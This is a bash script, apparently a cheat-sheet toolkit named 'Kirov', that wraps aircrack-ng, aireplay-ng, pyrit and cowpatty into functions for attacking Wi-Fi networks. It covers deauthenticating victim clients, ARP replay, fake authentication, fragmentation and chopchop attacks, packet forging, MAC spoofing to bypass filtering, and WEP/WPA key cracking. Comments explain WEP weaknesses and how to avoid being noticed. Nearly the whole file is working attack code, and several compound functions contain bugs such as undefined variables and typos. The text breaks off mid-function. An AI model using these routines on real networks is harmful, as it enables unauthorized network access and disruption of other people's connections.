#!/bin/bash
#
# Regards, the Alveare Solutions society.
#
# CHEAT SHEET

SCRIPT_NAME="Kirov"
VERSION="AirShip"
VERSION_NO='1.0'

DEPENDENCIES=(
'bridge-utils'
'wireshark'
'tshark'
'wavemon'
'airbase-ng'
'airmon-ng'
'aircrack-ng'
'airdump-ng'
'aireplay-ng'
'packetforge-ng'
'tcpdump'
'dhclient3'
'ifconfig'
'iwconfig'
'iw'
'john'
'pyrit'
'genpmk'
)

# [ NOTE ]: The IV is included in each packet and is different in each packet.
#           It is used to generate a distinct 'packet key' for each packet, the packet
#           key consisting of the fixed master key and the initialization vector. It's
#           sent in the clear over the wire, but it does encrypt because it is part of
#           the key. The point is to encrypt each packet with a different key.

# [ NOTE ]: Before beeing able to crack WEP you'll need between 40k and 85k
#           different initialization vectors. IV's can be reused so the number of IV's is
#           usually a bit lower than the number of data packets captured.

# [ NOTE ]: Monitor mode is a special mode that allows your computer to listen to
#           every wireless packet. This mode also allows you to inject paqckets into a
#           network. This will create another interface, and append 'mon' to it. So,
#           wlan0 becomes wlan0mon. Run iwconfig to confirm the mode.

# [ NOTE ]: Header -
#           BSSID   - The MAC address of the Access Point
#           RXQ     - Quality of the signal, when locked on a channel
#           PWR     - Signal strength. Some drivers don't report it
#           Beacons - Number of beacon frames received. If you don't have a signal
#                     strength you can estimate it by the number of beacons; the more beacons,
#                     the better the signal quality.
#           Data    - Number of data frames received
#           CH      - Channel the Access Point is operating on
#           MB      - Speed of AP Mode. 11 is pure 802.11b, 54 pure 802.11g. Values
#                     between are a mixture.
#           ENC     - Encryption: OPN: no encryption, WEP: WEP encryption, WPA: WPA or
#                     WPA2 encryption, WEP?: WEP or WPA (don't know yet)
#           ESSID   - The network name. Sometimes hidden.
#        -- Footer --
#           BSSID   - The MAC of the Access Point this client found
#           STATION - The MAC of the client itself
#           PWR     - Signal strength. Some drivers don't report it
#           Packets - Number of data frames received.
#           AP      - Access point.

# [ NOTE ]: ARP Replay - if we already know that packet injection works, we can
# do something to massively speed up capturing IVs - ARP Request Reinjection.
# -- The Ideea --
# ARP works (simplified) by broadcasting a query for an IP and the device that
# has this IP send back an answer. Because WEP does not protect against replay,
# you cn sniff a packet, send it out again and again and it is still valid. So
# you just have to capture and replay and ARP-request targeted at the AP to
# create lots of traffic (and sniff IVs).
# -- The Lazy Way --
# First open a window with an airodump-ng sniffing for traffic (see above).
# aireplay-ng and airodump-ng can run together. Wait for a client to show up on
# the target network. Then start the attack:
# ~$ aireplay-ng --arpreplay -b 00:01:02:03:04:05 -h 00:04:05:06:07:08 wlan0mon
# Now you have to wair for an ARP packet to arrive. Usually you'll have to wait
# for a few minutes.
# If you have to stop replaying, you don'y have to wait for the next ARP
# packet to show up, but you can re-user the previously captured packet(s) with
# the -r <file-name> option.
# When using the ARP injection technique, you can use the PTW method to crack
# the WEP key. This dramatically reduces the number of data packets you need to
# also the time needed. You must capture the full packet in airodump-ng,
# meaning do not user the --ivs option when starting it. For aircrack-ng, use
# aircrack -z <filename>. (PTW is the default attack)
# If the number of data packets received by airodump-ng sometimes stops
# increasing you maybe have to reduce the replay-rate. You do this with the -x
# <packets-per-second> option. I usually start out with 50 and reduce until
# packets are received continuously again. Better positioning of your antenna
# usually also helps.
# -- The aggressive way --
# Most operating systems clear the ARP cache on disconnection. If they want to
# send the next packet after reconnection (or just use DHCP), they have to send
# out ARP requests. So the idea is to disconnect a client and force it to
# reconnect to capture an ARP-request. A side-effect is that upi can sniff the
# ESSID and possibly a keystream during reconnection too. This comes in handy
# if the ESSID of your target is hidden, or if it uses shared-key authentication.
# Keep your airodump-ng and aireplay-ng running. Open another window and run a
# deauthentication attack:
# ~$ aireplay-ng --deauth 5 -a 00:01:02:03:04:05 -c 00:04:05:06:07:08 wlan0mon
#                              <access-point-bssid> <mac-of-targeted-client>
# Wait a few seconds and  your ARP replay should start running. Most clients
# try to reconnect automatically. But the risk that someone recognizes this
# attack or at least attention is drawn to the stuff happening on the WLAN is
# higher than with other attacks.

# CHEAT SHEET

function start_arp_replay_attack () {
    local BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    exec_msg "aireplay-ng -3 -b $BSSID -h $VICTIM_MAC $INTERFACE"
    aireplay-ng -3 -b "$BSSID" -h "$VICTIM_MAC" "$INTERFACE"
    return $?
}

function brute_crack_wep_key () {
    local CAPTURE_FILE="$2"
    local BSSID="$3"
    local OPT_ARGS=
    if [ ! -z "$BSSID" ]; then
        local OPT_ARGS="-b $BSSID"
    fi
    exec_msg "aircrack-ng $OPT_ARGS $CAPTURE_FILE"
    aircrack-ng $OPT_ARGS "$CAPTURE_FILE"
    return $?
}

function start_database_attack () {
    local DB_FILE="$2"
    local CAPTURE_FILE="$3"
    exec_sg "aircrack-ng -r $DB_FILE $CAPTURE_FILE"
    aircrack-ng -r "$DB_FILE" "$CAPTURE_FILE"
    return $?
}

function airolib_import_essids () {
    local DB_FILE="$2"
    local ESSID_FILE="$3"
    exec_msg "airolib-ng $DB_FILE --import essid $ESSID_FILE"
    airolib-ng "$DB_FILE" --import essid "$ESSID_FILE"
    return $?
}

function airolib_import_passwords () {
    local DB_FILE="$2"
    local PASS_FILE="$3"
    exec_msg "airolib-ng $DB_FILE --import passwd $PASS_FILE"
    airolib-ng "$DB_FILE" --import passwd "$PASS_FILE"
    return $?
}

function airolib_clean_database_junk () {
    local DB_FILE="$2"
    exec_msg "airolib-ng $DB_FILE --clean all"
    airolib-ng "$DB_FILE" --clean all
    return $?
}

function airolib_show_database_stats () {
    local DB_FILE="$2"
    exec_msg "airolib-ng $DB_FILE --stats"
    airolib-ng "$DB_FILE" --stats
    return $?
}

function airolib_start_batch_processing () {
    local DB_FILE="$2"
    exec_msg "airolib-ng $DB_FILE --batch"
    airolib-ng "$DB_FILE" --batch
    return $?
}

function airolib_verify_all_pairwise_master_keys () {
    local DB_FILE="$2"
    exec_msg "airolib-ng $DB_FILE --verify all"
    airolib-ng "$DB_FILE" --verify all
    return $?
}

function pyrit_translate_database_password_master_keys () {
    exec_msg "pyrit batch"
    pyrit batch
    return $?
}

function pyrit_add_essid_to_database () {
    local ESSID="$2"
    exec_msg "pyrit -e $ESSID create_essid"
    pyrit -e "$ESSID" create_essid
    return $?
}

function pyrit_attack_eapol_handshake_in_capture_file () {
    local CAPTURE_FILE="$2"
    exec_msg "pyrit -r $CAPTURE_FILE attack_db"
    pyrit -r "$CAPTURE_FILE" attack_db
    return $?
}

function pyrit_import_wordlist () {
    local WORDLIST_FILE="$2"
    exec_msg "pyrit -i $WORDLIST_FILE import_passwords"
    pyrit -i "$WORDLIST_FILE" import_passwords
    return $?
}

function pyrit_dict_crack_wep_key () {
    local WORDLIST_FILE="$2"
    local CAPTURE_FILE="$3"
    local BSSID="$4"
    exec_msg "pyrit -r $CAPTURE_FILE -b $BSSID -i $WORDLIST_FILE attack_passthrough"
    pyrit -r "$CAPTURE_FILE" -b "$BSSID" -i "$WORDLIST_FILE" attack_passthrough
    return $?
}

function wpa_precomputation_attack () {
    local ESSID="$2"
    local WORDLIST_FILE="$3"
    local OUT_HASH_FILE="${4:--}"
    exec_msg "genpmk -s $ESSID -f $WORDLIST_FILE -d $OUT_HASH_FILE"
    genpmk -s "$ESSID" -f "$WORDLIST_FILE" -d "$OUT_HASH_FILE"
    return $?
}

function cowpatty_hash_crack_wep_key () {
    local HASH_FILE="$2"
    local CAPTURE_FILE="$3"
    local ESSID="$4"
    exec_msg "cowpatty -r $CAPTURE_FILE -d $HASH_FILE -2 -s $ESSID"
    cowpatty -r "$CAPTURE_FILE" -d "$HASH_FILE" -2 -s "$ESSID"
    return $?
}

function cowpatty_dict_crack_wep_key () {
    local WORDLIST_FILE="$2"
    local CAPTURE_FILE="$3"
    local ESSID="$4"
    exec_msg "cowpatty -r $CAPTURE_FILE -f $WORDLIST_FILE -s $ESSID"
    cowpatty -r "$CAPTURE_FILE" -f "$WORDLIST_FILE" -s "$ESSID"
    return $?
}

function john_dict_crack_wep_key () {
    local WORDLIST_FILE="$2"
    local CAPTURE_FILE="$3"
    local ESSID="$4"
    exec_msg "john --wordlist=${WORDLIST_FILE} --rules --stdout | aircrack-ng -0 -e $ESSID -w - $CAPTURE_FILE"
    john "--wordlist=${WORDLIST_FILE}" --rules --stdout | aircrack-ng -0 -e "$ESSID" -w - "$CAPTURE_FILE"
    # or
#   aircrack-ng <file-name>.cap -J <out-file>
#   hccap2john <out-file>.hccap > <john-out-file>
#   john <john-out-file>
    return $?
}

function dictionary_crack_wep_key () {
    local WORDLIST_FILE="$2"
    local CAPTURE_FILE="$3"
    local BSSID="$4"
    local ARGS='-0'
    if [ ! -z "$WORDLIST_FILE" ]; then
        local ARGS="$ARGS -w $WORDLIST_FILE"
    fi
    if [ ! -z "$BSSID" ]; then
        local ARGS="$ARGS -b $BSSID"
    fi
    local ARGS="$ARGS $CAPTURE_FILE"
    exec_msg "aircrack-ng $ARGS"
    aircrack-ng $ARGS
    return $?
}

function monitor_interface () {
    local INTERFACE="${2:-wlan0mon}"
    exec_msg "airodump-ng $INTERFACE"
    airodump-ng "$INTERFACE"
    # nmcli -f ALL dev wifi
    return $?
}

function show_interface_details () {
    local INTERFACE="$2"
    exec_msg "ifconfig $INTERFACE"
    ifconfig "$INTERFACE"
    return $?
}

function wavemon () {
    exec_msg "wavemon"
    wavemon
    return $?
}

function change_interface_channel () {
    local INTERFACE="${2:-wlan0}"
    local CHANNEL=${3:-5} # [ex]: 1-14
    exec_msg "iwconfig $INTERFACE channel $CHANNEL"
    iwconfig "$INTERFACE" channel $CHANNEL
    return $?
}

function start_deauth_attack () {
    local ACCESS_POINT_BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    local DEPLAY=${5:-20}
    exec_msg "aireplay-ng -0 $DEPLAY -a $ACCESS_POINT_BSSID -c $VICTIM_MAC $INTERFACE"
    aireplay-ng -0 $DEPLAY -a "$ACCESS_POINT_BSSID" -c "$VICTIM_MAC" "$INTERFACE"
    return $?
}

function restart_wpa_supplicant () {
    exec_msg "service wpa_supplicant restart"
    service wpa_supplicant restart
    return $?
}

function tear_down_interface () {
    local INTERFACE="${2:-wlan0mon}"
    exec_msg "ifconfig $INTERFACE down"
    ifconfig "$INTERFACE" down
    return $?
}

function set_interface_monitor_mode () {
    local INTERFACE="${2:-wlan0mon}"
    exec_msg "iwconfig $INTERFACE mode monitor"
    iwconfig "$INTERFACE" mode monitor
    return $?
}

function set_up_interface () {
    local INTERFACE="${2:-wlan0mon}"
    exec_msg "ifconfig $INTERFACE up"
    ifconfig "$INTERFACE" up
    return $?
}

function start_monitor_interface () {
    local INTERFACE="${2:-wlan0}"
    local CHANNEL=${3:-5}
    exec_msg "airmon-ng start $INTERFACE $CHANNEL"
    airmon-ng start "$INTERFACE" $CHANNEL
    return $?
}

function stop_monitor_interface () {
    local INTERFACE="${2:-wlan0mon}"
    exec_msg "airmon-ng stop $INTERFACE"
    airmon-ng stop "$INTERFACE"
    return $?
}

function check_interface () {
    local INTERFACE="${2:-wlan0}"
    exec_msg "iwconfig $INTERFACE"
    iwconfig "$INTERFACE"
    return $?
}

function check_injection_is_working () {
    local INTERFACE="${2:-wlan0mon}"
    exec_msg "aireplay-ng -9 $INTERFACE"
    aireplay-ng -9 "$INTERFACE"
    return $?
}

function monitor_wireless_access_point () {
    local ACCESS_POINT_BSSID="$2"
    local INTERFACE="${3:-wlan0mon}"
    local CHANNEL=${4:-5}
    exec_msg "airodump-ng -c $CHANNEL --bssid $ACCESS_POINT_BSSID $INTERFACE"
    airodump-ng -c $CHANNEL --bssid "$ACCESS_POINT_BSSID" "$INTERFACE"
    return $?
}

function monitor_victim_mac_on_interface_channel () {
    local ACCESS_POINT_BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    local CHANNEL=${5:-5}
    exec_msg "airodump-ng -c $CHANNEL -bssid $ACCESS_POINT_BSSID -c $VICTIM_MAC $INTERFACE"
    airodump -c $CHANNEL -bssid "$ACCESS_POINT_BSSID" -c "$VICTIM_MAC" "$INTERFACE"
    return $?
}

function change_interface_mac_address () {
    local NEW_MAC_ADDR="$2"
    local INTERFACE="${3:-wlan0}"
    exec_msg "macchanger -mac $NEW_MAC_ADDR $INTERFACE"
    macchanger -mac "$NEW_MAC_ADDR" "$INTERFACE"
    return $?
}

function show_all_interface_details () {
    exec_msg "iwconfig"
    iwconfig
    return $?
}

function capture_access_point_packets_to_pcap () {
    local BSSID="$2"
    local NET_DUMP_PREFIX="$3"
    local INTERFACE="${4:-wlan0mon}"
    local CHANNEL=${5:-5}
    exec_msg "airodump-ng -c $CHANNEL --bssid $BSSID -w $NET_DUMP_PREFIX ${INTERFACE}"
    airodump-ng -c $CHANNEL --bssid "$BSSID" -w "$NET_DUMP_PREFIX" "${INTERFACE}"
    return $?
}

function ptw_crack_wep_key () {
    local CAPTURE_FILE="$2"
    exec_msg "aircrack-ng -0 $CAPTURE_FILE"
    aircrack-ng -0 "$CAPTURE_FILE"
    return $?
}

function show_wireless_device_details () {
    exec_msg "iw list"
    iw list
    return $?
}

function set_wifi_regulatory_domain () {
    local REGDOMAIN="${2:-BO}" # [ NOTE ]: Depends on country in which wireless device is supposed to work
    exec_msg "iw reg set $REGDOMAIN"
    iw reg set "$REGDOMAIN"
    return $?
}

function update_interface_txpower () {
    local INTERFACE="${2:-wlan0}"
    local POWER=${3:-25}
    exec_msg "iwconfig $INTERFACE txpower $POWER"
    iwconfig "$INTERFACE" txpower $POWER # <NmW|NdBm|off|auto>
    return $?
}

function start_fake_auth_attack () {
    local ESSID="$2"
    local BSSID="$3"
    local VICTIM_MAC="$4"
    local INTERFACE="${5:-wlan0mon}"
    local DELAY=${6:-0}
    local KEEP_ALIVE_SEC=${7:-1}
    exec_msg "aireplay-ng -1 $DELAY -e $ESSID -a $BSSID -h $VICTIM_MAC -q $KEEP_ALIVE_SEC $INTERFACE"
    aireplay-ng -1 $DELAY -e "$ESSID" -a "$BSSID" -h "$VICTIM_MAC" -q "$KEEP_ALIVE_SEC" "$INTERFACE"
    return $?
}

function start_interactive_attack () {
    local BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    local FRAME_COUNT=${5:-1}
    local MIN_PACKET_SIZE=${6:-68}
    local MAX_PACKET_SIZE=${7:-86}
    local PACKETS_PER_SEC=${8:-1000}
    local FRAME_CONTROL_HEX=$9
    local OPT_ARGS=
    if [ ! -z "$FRAME_CONTROL_HEX" ]; then
        local OPT_ARGS="-p $FRAME_CONTROL_HEX"
    fi
    exec_msg "aireplay-ng -2 $OPT_ARGS -b $BSSID -d $VICTIM_MAC -f $FRAME_COUNT -m $MIN_PACKET_SIZE -n $MAX_PACKET_SIZE $INTERFACE"
    aireplay-ng -2 $OPT_ARGS -b "$BSSID" -d "$VICTIM_MAC" -f $FRAME_COUNT -m $MIN_PACKET_SIZE -n $MAX_PACKET_SIZE "$INTERFACE"
    return $?
}

function inject_packets_from_cap_file () {
    local CAPTURE_FILE="$2"
    local INTERFACE="${3:-wlan0mon}"
    exec_msg "aireplay-ng -2 -r $CAPTURE_FILE $INTERFACE"
    aireplay-ng -2 -r "$CAPTURE_FILE" "$INTERFACE"
    return $?
}

function start_ptw_attack () {
    local CAPTURE_FILE="$2"
    local MAX_PACKET_SIZE=${3:-64}
    exec_msg "aircrack-ng -0 -z -n $MAX_PACKET_SIZE $CAPTURE_FILE"
    aircrack-ng -0 -z -n $MAX_PACKET_SIZE "$CAPTURE_FILE"
    return $?
}

function start_fragment_attack () {
    local BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    exec_msg "aireplay-ng -5 -b $BSSID -h $VICTIM_MAC $INTERFACE"
    aireplay-ng -5 -b "$BSSID" -h "$VICTIM_MAC" "$INTERFACE"
    return $?
}

function forge_encrypted_packets_from_prga () {
    local BSSID="$2"
    local VICTIM_MAC="$3"
    local PRGA_FILE="$4"
    local CAPTURE_FILE="$5"
    local SRC_IPv4_PORT="${6:-255.255.255.255}"
    local DST_IPV4_PORT="${7:-255.255.255.255}"
    exec_msg "packetforge-ng -0 -a $BSSID -h $VICTIM_MAC -k $DST_IPV4_PORT -l $SRC_IPV4_PORT -y $PRGA_FILE -w $CAPTURE_FILE"
    packetforge-ng -0 -a "$BSSID" -h "$VICTIM_MAC" -k $DST_IPV4_PORT -l $SRC_IPV4_PORT -y "$PRGA_FILE" -w "$CAPTURE_FILE"
    return $?
}

function read_linklevel_headers_from_capture_file () {
    local CAPTURE_FILE="$2"
    exec_msg "tcpdump -n -vvv -e -s0 -r $CAPTURE_FILE"
    tcpdump -n -vvv -e -s0 -r "$CAPTURE_FILE"
    return $?
}

function show_interface_mac_address () {
    local INTERFACE="${2:wlan0mon}"
    exec_msg "macchanger --show $INTERFACE"
    macchanger --show "$INTERFACE"
    return $?
}

function cleanup_capture_files () {
    local FILE_PREFIXES=( ${@:2} )
    for fl_prfx in ${FILE_PREFIXES[@]}; do
        exec_msg "rm -i ${fl_prfx}*"
        rm -i "$fl_prfx"*
    done
    return $?
}

function start_chopchop_attack () {
    local BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    exec_msg "aireplay-ng -4 -b $BSSID -h $VICTIM_MAC $INTERFACE"
    aireplay-ng -4 -b "$BSSID" -h "$VICTIM_MAC" "$INTERFACE"
    return $?
}

# COMPOUND
# [ NOTE ]: Under construction - no logic operations between actions.

function start_monitor_mode () {
    local INTERFACE="${2:-wlan0}"
    local CHANNEL=${3:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    monitor_interface - "${INTERFACE}mon"
    return $?
}

function stop_monitor_mode () {
    local INTERFACE="${2:-wlan0mon}"
    stop_monitor_interface - "$INTERFACE"
    monitor_interface - "$INTERFACE"
    return $?
}

function set_tx_power () {
    echo "[ WARNING ]: Under construction, building..."
    local INTERFACE="${2:-wlan0}"
    local POWER=${3:-25} # [ NOTE ]: txpower is 30 (generally - depends on your country)
    set_wifi_regulatory_domain - "BO"
    update_interface_txpower - "$INTERFACE" $POWER
    show_all_interface_details
    return $?
}

function reset_interface () {
    echo "[ WARNING ]: Under construction, building..."
    local INTERFACE="${2:-wlan0mon}"
    stop_monitor_interface - "$INTERFACE"
    restart_wpa_supplicant
    return $?
}

function deauthenticate_device_off_access_point () {
    echo "[ WARNING ]: Under construction, building..."
    local ACCESS_POINT_BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0}"
    local CHANNEL=${5:-5} # [ex]: 1-14
    change_interface_channel - "$INTERFACE" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    return $?
}

function set_monitor_mode () {
    echo "[ WARNING ]: Under construction, building..."
    local INTERFACE="${2:-wlan0mon}"
    tear_down_interface - "$INTERFACE"
    set_interface_monitor_mode - "$INTERFACE"
    set_up_interface - "$INTERFACE"
    return $?
}

function find_hidden_ssid () {
    echo "[ WARNING ]: Under construction, building..."
    local ACCESS_POINT_BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0mon}"
    local CHANNEL=${5:-5}
    start_monitor_interface - "$INTERFACE"
    monitor_wireless_access_point - "$ACCESS_POINT_BSSID" "$INTERFACE" $CHANNEL
    deauthenticate_device_off_access_point - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "$INTERFACE" $CHANNEL
    return $?
}

function bypass_mac_filtering () {
    echo "[ WARNING ]: Under construction, building..."
    local ACCESS_POINT_BSSID="$2"
    local VICTIM_MAC="$3"
    local INTERFACE="${4:-wlan0}"
    local CHANNEL=${5:-5}
    start_monitor_interface - "$INTERFACE"
    monitor_victim_mac_on_interface_channel - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon" $CHANNEL
    tear_down_interface - "${INTERFACE}mon"
    change_interface_mac_address "$VICTIM_MAC" "${INTERFACE}mon"
    set_up_interface - "${INTERFACE}mon"
    start_interactive_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    return $?
}

function crack_wpa () {
    echo "[ WARNING ]: Under construction, building..."
    local BSSID="$2"
    local NET_DUMP_PREFIX="$3"
    local CAPTURE_FILE="$4"
    local CLIENT_MAC="$5"
    local WORDLIST_FILE="$6"
    local INTERFACE="${6:-wlan0}"
    local CHANNEL=${7:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    show_all_interface_details
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 20
    dictionary_crack_wep_key - "$WORDLIST_FILE" "$CAPTURE_FILE"
    return $?
}

function crack_wep_with_connected_clients () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local WORDLIST_FILE="$7"
    local INTERFACE="${8:-wlan0}"
    local CHANNEL=${9:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    start_interactive_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1 68 86
    inject_packets_from_cap_file - "$CAPTURE_FILE" "${INTERFACE}mon"
    start_ptw_attack - "$CAPTURE_FILE" 64
    return $?
}

function arp_amplification () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local PRGA_FILE="$7"
    local INTERFACE="${8:-wlan0}"
    local CHANNEL=${9:-5}
    local SRC_IPv4_PORT="${10:-255.255.255.255}"
    local DST_IPV4_PORT="${11:-255.255.255.255}"
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 500 8
    start_fragment_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    forge_encrypted_packets_from_prga - "$BSSID" "$VICTIM_MAC" "$PRGA_FILE" "$CAPTURE_FILE" "$SRC_IPv4_PORT" "$DST_IPV4_PORT"
    read_linklevel_headers_from_capture_file - "$CAPTURE_FILE"
    forge_encrypted_packets_from_prga - "$BSSID" "$VICTIM_MAC" "$PRGA_FILE" "$CAPTURE_FILE" "$SRC_IPv4_PORT" "$DST_IPV4_PORT"
    inject_packets_from_cap_file - "$CAPTURE_FILE" "${INTERFACE}mon"
    return $?
}

function crack_wep_shared_key_auth () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local INTERFACE="${7:-wlan0}"
    local CHANNEL=${8:-5}
    local SRC_IPv4_PORT="${9:-255.255.255.255}"
    local DST_IPV4_PORT="${10:-255.255.255.255}"
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 60 1
    start_interactive_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1
    start_ptw_attack - "$CAPTURE_FILE" 64
    return $?
}

function crack_clientless_wep_frag () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local PRGA_FILE="$7"
    local INTERFACE="${8:-wlan0}"
    local CHANNEL=${9:-5}
    local SRC_IPv4_PORT="${10:-255.255.255.255}"
    local DST_IPV4_PORT="${11:-255.255.255.255}"
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "$INTERFACE" $CHANNEL
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 600
    start_fragment_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    forge_encrypted_packets_from_prga - "$BSSID" "$VICTIM_MAC" "$PRGA_FILE" "$CAPTURE_FILE" "$SRC_IPv4_PORT" "$DST_IPV4_PORT"
    read_linklevel_headers_from_capture_file - "$CAPTURE_FILE"
    start_interactive_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 1 68 86
    return $?
}

function crack_clientless_wep_korek () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local PRGA_FILE="$7"
    local INTERFACE="${8:-wlan0}"
    local CHANNEL=${9:-5}
    local SRC_IPv4_PORT="${10:-255.255.255.255}"
    local DST_IPV4_PORT="${11:-255.255.255.255}"
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_fake_auth_attack - "$ESSID" "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon" 600
    start_chopchop_attack - "$BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    read_linklevel_headers_from_capture_file - "$CAPTURE_FILE"
    forge_encrypted_packets_from_prga - "$BSSID" "$VICTIM_MAC" "$PRGA_FILE" "$CAPTURE_FILE" "$SRC_IPv4_PORT" "$DST_IPV4_PORT"
    inject_packets_from_cap_file - "$CAPTURE_FILE" "${INTERFACE}mon"
    ptw_crack_wep_key - "$CAPTURE_FILE"
    return $?
}

function dictionary_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local BSSID="$2"
    local NET_DUMP_PREFIX="$3"
    local CAPTURE_FILE="$4"
    local VICTIM_MAC="$5"
    local INTERFACE="${6:-wlan0}"
    local CHANNEL=${7:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    dictionary_crack_wep_key - "$WORDLIST_FILE" "$CAPTURE_FILE" "$BSSID"
    return $?
}

function dictionary_john_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local INTERFACE="${7:-wlan0}"
    local CHANNEL=${8:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    john_dict_crack_wep_key - "$WORDLIST_FILE" "$CAPTURE_FILE" "$ESSID"
    return $?
}

function dictionary_cowpatty_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local INTERFACE="${7:-wlan0}"
    local CHANNEL=${8:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    cowpatty_dict_crack_wep_key - "$WORDLIST_FILE" "$CAPTURE_FILE" "$ESSID"
    wpa_precomputation_attack - "$ESSID" "$WORDLIST_FILE" "${CAPTURE_FILE}.hash"
    cowpatty_dict_crack_wep_key - "${CAPTURE_FILE}.hash" "$CAPTURE_FILE" "$ESSID"
    return $?
}

function dictionary_pyrit_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID="$2"
    local BSSID="$3"
    local NET_DUMP_PREFIX="$4"
    local CAPTURE_FILE="$5"
    local VICTIM_MAC="$6"
    local INTERFACE="${7:-wlan0}"
    local CHANNEL=${8:-5}
    start_monitor_interface - "$INTERFACE" $CHANNEL
    capture_access_point_packets_to_pcap - "$BSSID" "$NET_DUMP_PREFIX" "${INTERFACE}mon" $CHANNEL
    start_deauth_attack - "$ACCESS_POINT_BSSID" "$VICTIM_MAC" "${INTERFACE}mon"
    pyrit_dict_crack_wep_key - "$WORDLIST_FILE" "$CAPTURE_FILE" "$BSSID"
    pyrit_import_wordlist - "$WORDLIST_FILE"
    pyrit_add_essid_to_database - "$ESSID"
    pyrit_translate_database_password_master_keys
    pyrit_attack_eapol_handshake_in_capture_file - "$CAPTURE_FILE"
    return $?
}

function precomputed_wpa_keys_database_attack () {
    echo "[ WARNING ]: Under construction, building..."
    local ESSID_FILE="$2"
    local BSSID="$3"
